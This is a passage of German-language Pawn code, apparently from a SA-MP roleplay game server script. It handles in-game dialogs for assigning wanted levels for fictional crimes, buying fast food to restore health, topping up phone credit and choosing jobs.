					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 1;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Versuchtes Kidnapping, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 1, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Versuchtes Kidnapping, Zeuge: %s, Vergebene Wanteds: 1", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 4:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 1 Wanted wegen Flucht gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 1;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Flucht, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 1, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Flucht, Zeuge: %s, Vergebene Wanteds: 1", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 5:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 1 Wanted wegen versuchte Flucht gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 1;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: versuchte Flucht, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 1, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: versuchte Flucht, Zeuge: %s, Vergebene Wanteds: 1", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 6:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 1 Wanted wegen Beihilfe zur Flucht gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 1;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Beihilfe zur Flucht, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 1, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Beihilfe zur Flucht, Zeuge: %s, Vergebene Wanteds: 1", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 7:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 1 Wanted wegen Verweigerung gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 1;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Verweigerung, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 1, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Verweigerung, Zeuge: %s, Vergebene Wanteds: 1", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 8:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 1 Wanted wegen Behinderung der Justiz gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 1;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Behinderung der Justiz, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 1, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Behinderung der Justiz, Zeuge: %s, Vergebene Wanteds: 1", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 9:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 2 Wanteds wegen illegalem Waffenhandel gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 2;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: illegaler Waffenhandel, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 2, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: illegaler Waffenhandel, Zeuge: %s, Vergebene Wanteds: 2", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 10:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 2 Wanteds wegen Einsperren ins Gangjail gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 2;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Einsperren ins Gangjail, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 2, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Einsperren ins Gangjail, Zeuge: %s, Vergebene Wanteds: 2", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 11:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 2 Wanteds wegen Beamten-/Zivilistenangriff gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 2;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Beamten-/Zivilistenangriff, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 2, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Beamten-/Zivilistenangriff, Zeuge: %s, Vergebene Wanteds: 2", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 12:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 3 Wanteds wegen Entführung gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 3;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Entführung, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 3, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Entführung, Zeuge: %s, Vergebene Wanteds: 3", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 13:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 3 Wanteds wegen Beamten-/Zivilistenbeschuss gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 3;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Beamten-/Zivilistenbeschuss, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 3, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Beamten-/Zivilistenbeschuss, Zeuge: %s, Vergebene Wanteds: 3", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 14:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 3 Wanteds wegen Anschlag gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 3;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Anschlag, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 3, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Anschlag, Zeuge: %s, Vergebene Wanteds: 3", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 15:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 4 Wanteds wegen Beamten-/Zivilistenmord gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 4;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Beamten-/Zivilistenmord, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 4, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Beamten-/Zivilistenmord, Zeuge: %s, Vergebene Wanteds: 4", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 16:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 4 Wanteds wegen Bankraub gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 4;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Bankraub, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 4, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Bankraub, Zeuge: %s, Vergebene Wanteds: 4", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 17:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 5 Wanteds wegen Präsidentenbeschuss gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 5;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Präsidentenbeschuss, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 5, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Präsidentenbeschuss, Zeuge: %s, Vergebene Wanteds: 5", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 18:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 6 Wanteds wegen Präsidentenmord gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 6;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Präsidentenmord, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 6, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Präsidentenmord, Zeuge: %s, Vergebene Wanteds: 6", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 19:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 4 Wanteds wegen Einbruch in Area 51 gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 6;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Einbruch in Area 51, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 4, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Einbruch in Area 51, Zeuge: %s, Vergebene Wanteds: 4", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 20:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 4 Wanteds wegen Ausbruchshilfe aus Alcatraz gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 6;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Ausbruchshilfe aus Alcatraz, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 4, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Ausbruchshilfe aus Alcatraz, Zeuge: %s, Vergebene Wanteds: 4", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
				}
			}
		}
	}


//===== BSN MENÜ =====//
	if(dialogid == BSN)
	{
	    if(response)
	    {
	        new Float:health;
            GetPlayerHealth(playerid,health);
	        if(listitem == 0)
	        {
                if (health > 100.0)
                {
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist satt!");
			        UnFreezePlayer(playerid);
				    return 1;
				}
	            SendClientMessage(playerid, COLOR_GREEN, "3 Chicken Nuggets für 3$ gekauft, schöne Weiterfahrt.");
				SBizzInfo[15][sbProducts] -= 3;
				SBizzInfo[15][sbTill] += 3;
	            GivePlayerMoneySave(playerid, -3);
    			GetPlayerHealth(playerid,health);
				SetPlayerHealth(playerid, health+5);
	            UnFreezePlayer(playerid);
			}
			if(listitem == 1)
			{
                if (health > 100.0)
                {
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist satt!");
			        UnFreezePlayer(playerid);
				    return 1;
				}
			    SendClientMessage(playerid, COLOR_GREEN, "12 Chicken Nuggets für 10$ gekauft, schöne Weiterfahrt.");
				SBizzInfo[15][sbProducts] -= 3;
				SBizzInfo[15][sbTill] += 10;
			    GivePlayerMoneySave(playerid, -10);
    			GetPlayerHealth(playerid,health);
				SetPlayerHealth(playerid, health+7);
			    UnFreezePlayer(playerid);
			}
			if(listitem == 2)
			{
                if (health > 100.0)
                {
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist satt!");
			        UnFreezePlayer(playerid);
				    return 1;
				}
			    SendClientMessage(playerid, COLOR_GREEN, "20 Chicken Nuggets für 10$ gekauft, schöne Weiterfahrt.");
				SBizzInfo[15][sbProducts] -= 3;
				SBizzInfo[15][sbTill] += 16;
			    GivePlayerMoneySave(playerid, -16);
    			GetPlayerHealth(playerid,health);
				SetPlayerHealth(playerid, health+9);
			    UnFreezePlayer(playerid);
			}
			if(listitem == 3)
			{
                if (health > 100.0)
                {
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist satt!");
			        UnFreezePlayer(playerid);
				    return 1;
				}
			    SendClientMessage(playerid, COLOR_GREEN, "Eine Portion Pommes für 2$ gekauft, schöne Weiterfahrt.");
				SBizzInfo[15][sbProducts] -= 3;
				SBizzInfo[15][sbTill] += 2;
			    GivePlayerMoneySave(playerid, -2);
    			GetPlayerHealth(playerid,health);
				SetPlayerHealth(playerid, health+5);
			    UnFreezePlayer(playerid);
			}
			if(listitem == 4)
			{
                if (health > 100.0)
                {
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist satt!");
			        UnFreezePlayer(playerid);
				    return 1;
				}
			    SendClientMessage(playerid, COLOR_GREEN, "Einen Cheesburger für 5$ gekauft, schöne Weiterfahrt.");
				SBizzInfo[15][sbProducts] -= 3;
				SBizzInfo[15][sbTill] += 5;
			    GivePlayerMoneySave(playerid, -5);
    			GetPlayerHealth(playerid,health);
				SetPlayerHealth(playerid, health+10);
			    UnFreezePlayer(playerid);
			}
			if(listitem == 5)
			{
                if (health > 100.0)
                {
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist satt!");
			        UnFreezePlayer(playerid);
				    return 1;
				}
			    SendClientMessage(playerid, COLOR_GREEN, "Einen Chickenburger für 8$ gekauft, schöne Weiterfahrt.");
				SBizzInfo[15][sbProducts] -= 3;
				SBizzInfo[15][sbTill] += 8;
			    GivePlayerMoneySave(playerid, -8);
    			GetPlayerHealth(playerid,health);
				SetPlayerHealth(playerid, health+15);
			    UnFreezePlayer(playerid);
			}
			if(listitem == 6)
			{
                if (health > 100.0)
                {
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist satt!");
			        UnFreezePlayer(playerid);
				    return 1;
				}
			    SendClientMessage(playerid, COLOR_GREEN, "Einen Big Mac für 10$ gekauft, schöne Weiterfahrt.");
				SBizzInfo[15][sbProducts] -= 3;
				SBizzInfo[15][sbTill] += 10;
			    GivePlayerMoneySave(playerid, -10);
    			GetPlayerHealth(playerid,health);
				SetPlayerHealth(playerid, health+20);
			    UnFreezePlayer(playerid);
			}
			if(listitem == 7)
			{
                if (health > 100.0)
                {
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist satt!");
			        UnFreezePlayer(playerid);
				    return 1;
				}
			    SendClientMessage(playerid, COLOR_GREEN, "Eine Cola für 3$ gekauft, schöne Weiterfahrt.");
				SBizzInfo[15][sbProducts] -= 3;
				SBizzInfo[15][sbTill] += 3;
			    GivePlayerMoneySave(playerid, -3);
    			GetPlayerHealth(playerid,health);
				SetPlayerHealth(playerid, health+5);
			    UnFreezePlayer(playerid);
			}
			if(listitem == 8)
			{
                if (health > 100.0)
                {
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist satt!");
			        UnFreezePlayer(playerid);
				    return 1;
				}
			    SendClientMessage(playerid, COLOR_GREEN, "Eine Fanta für 3$ gekauft, schöne Weiterfahrt.");
				SBizzInfo[15][sbProducts] -= 3;
				SBizzInfo[15][sbTill] += 3;
			    GivePlayerMoneySave(playerid, -3);
    			GetPlayerHealth(playerid,health);
				SetPlayerHealth(playerid, health+5);
			    UnFreezePlayer(playerid);
			}
			if(listitem == 9)
			{
                if (health > 100.0)
                {
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist satt!");
			        UnFreezePlayer(playerid);
				    return 1;
				}
			    SendClientMessage(playerid, COLOR_GREEN, "Eine Sprite für 3$ gekauft, schöne Weiterfahrt.");
				SBizzInfo[15][sbProducts] -= 3;
				SBizzInfo[15][sbTill] += 3;
			    GivePlayerMoneySave(playerid, -3);
    			GetPlayerHealth(playerid,health);
				SetPlayerHealth(playerid, health+5);
			    UnFreezePlayer(playerid);
			}
		}
	}
	if(dialogid == Guthaben)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
  				if(PlayerInfo[playerid][pCash] >= 30)
			   	{
			 		PlayerInfo[playerid][pHandyGeld] += 30;
		     		SendClientMessage(playerid,COLOR_GREEN , "Du hast dein Handy für 30$ aufgeladen.");
		     		GivePlayerMoneySave(playerid, -30);
		    	    FraktionsKasse[6] += 30;
			   	}
			   	else
			   	{
			 	 	SendClientMessage(playerid,COLOR_RED, "Du hast nicht genug Geld.");
			   	}
			}
			if(listitem == 1)
			{
  				if(PlayerInfo[playerid][pCash] >= 30)
			   	{
			 		PlayerInfo[playerid][pHandyGeld] += 60;
		     		SendClientMessage(playerid,COLOR_GREEN , "Du hast dein Handy für 60$ aufgeladen.");
		     		GivePlayerMoneySave(playerid, -60);
		    	    FraktionsKasse[6] += 60;
			   	}
			   	else
			   	{
				  	SendClientMessage(playerid,COLOR_RED, "Du hast nicht genug Geld.");
			   	}
			}
			if(listitem == 2)
			{
			  	if(PlayerInfo[playerid][pCash] >= 90)
			   	{
			 		PlayerInfo[playerid][pHandyGeld] += 90;
		     		SendClientMessage(playerid,COLOR_GREEN , "Du hast dein Handy für 90$ aufgeladen.");
		     		GivePlayerMoneySave(playerid, -90);
		    	    FraktionsKasse[6] += 90;
			   	}
			   	else
			   	{
				  	SendClientMessage(playerid,COLOR_RED, " Du hast nicht genug Geld ");
			   	}
			}
			if(listitem == 3)
			{
 		    ShowPlayerDialog(playerid, BANK, DIALOG_STYLE_LIST,"Menü", "Kontostand\nEinzahlen\nAuszahlen\nÜberweisen\nHandykarten", "Auswählen", "Beenden");
			}
		}
	}
    //===== JOBS =====//
	if(dialogid == DIALOG_iJOBS)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid, WD,DIALOG_STYLE_MSGBOX,"Job Waffendealer", "Als WaffenDealer kannst du mit Materialien Waffen verkaufen / dir selber geben.\nDie Materialien sind illegal also vorsicht vor den Cops!\nUm WaffenDealer zu werden, klicke auf Annehmen", "Annehmen", "Abbrechen");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, DD,DIALOG_STYLE_MSGBOX,"Job Drogendealer", "Als Drogendealer kannst du Drogen anlegen und verkaufen.\nDiese musst du vorher in der Crackhöhle nähe LS Gym kaufen.\nUm Drogendealer zu werden, klicke auf Annehmmen", "Annehmen", "Abbrechen");
			}
			if(listitem == 2)
			{
			    ShowPlayerDialog(playerid, FARMER, DIALOG_STYLE_MSGBOX, "Farmer", "An der Farm in Blueberry stehen 6 Mähdrescher, diese kann man zum Ernten von Hanfpflanzen benutzen\nFarmer werden benötigt, um Drogen zu ernten\nLohn pro Ernte: 10000$ (30 Minuten Pause nach jeder Ernte)\nDabei kannst du mit verschiedenen Drogendealen verhandeln.\nUm Farmer zu werden, klicke auf Annehmen.", "Annehmen", "Abbrechen");
			}
	        if(listitem == 3)
	        {
             	ShowPlayerDialog(playerid,DETE,DIALOG_STYLE_MSGBOX,"Job Detektiv","Als Detektiv spürst du für Geld leute auf und vermittelst deren Position.\nUm Detektiv zu werden, klicke auf Annehmen","Annehmen","Abbrechen");
			}
             if(listitem == 4)
	         {
             	ShowPlayerDialog(playerid,BUSFAHRER33,DIALOG_STYLE_MSGBOX,"Job Bosfahrer","Als Busfahrer kannst du verschiedene Haltestellen anfahren und dabei Spielern an ihr Ziel bringen.\nDein Gehalt bekommst du am ende der Linie\nUm Busfahrer zu werden, klicke auf Annehmen","Annehmen","Abbrechen");
	  			return 1;
	            }

             if(listitem == 5)
             {
             	ShowPlayerDialog(playerid,PILOT33,DIALOG_STYLE_MSGBOX,"Job Pilot","Als Pilot musst du Checkpoints Abfliegen.\nDien Gehalt bekommst du am ende der Runde\nUm Pilot zu werden, klicke auf Annehmen","Annehmen","Abbrechen");
	  			return 1;
	            }

			 if(listitem == 6)
	         {
	           //Zugfahrer
             	ShowPlayerDialog(playerid,ZUGFAHRER33,DIALOG_STYLE_MSGBOX,"Job Zugfahrer","Als Zugfahrer musst du Checkpoints Abfahren.\nDen Gehalt bekommst du am ende der Runde\nUm Zugfahrer zu werden, klicke auf Annehmen","Annehmen","Abbrechen");
	  			return 1;
	            }
	        if(listitem == 7)
	        {
            ShowPlayerDialog(playerid,ANWALT,DIALOG_STYLE_MSGBOX,"Job Anwalt","Als Anwalt kannst du Leute aus dem Knast befreien.\nDien Gehalt erhälst du von deinen Kunden, die du mit /free befreien kannst. \nUm Anwalt zu werden, klicke auf Annehmen","Annehmen","Abbrechen");
            }

	        if(listitem == 8)
	        {
            ShowPlayerDialog(playerid,MULLMANN,DIALOG_STYLE_MSGBOX,"Job Müllman","Als Müllman musst du Häuser abfahren und Müll aufladen \nUm Müllman zu werden, klicke auf Annehmen","Annehmen","Abbrechen");
            }
		}
	}
	if(dialogid == PRODI)
	{
	    if(response == 0)
	    {
            ShowPlayerDialog(playerid, DIALOG_JOBS, DIALOG_STYLE_LIST, "Los Santos Arbeitsamt", "Detektiv\nAnwalt\nMüllmann\nPilot\nAngler\nBodyguard\nZeitungsjunge\nBoxer\nBusfahrer\nPizzalieferant", "Auswählen", "Abbrechen");
		}
		if(response == 1)
		{
		}
	}
	if(dialogid == ZUGFAHRER33)//HIERAMK payday vorwärts laufen lassen
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Herzlichen Glückwunsch du bist jetzt Zugfahrer!");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Deine Befehle siehst du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du muss jetzt mindestens 1 Stunde als Zugfahrer arbeiten!");
		    PlayerInfo[playerid][pJob] = 3;
	        SendClientMessage(playerid, COLOR_ORANGE, "Marker gesetzt! Begebe dich zur Roten Markierung auf der Karte!");
			SetPlayerCheckpoint(playerid,1434.0758,2619.8389,11.3926,6.0);
			Navi[playerid] = 1;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == PILOT33)//HIERAMK payday vorwärts laufen lassen
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Herzlichen Glückwunsch du bist jetzt Pilot!");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Deine Befehle siehst du unter /help.");
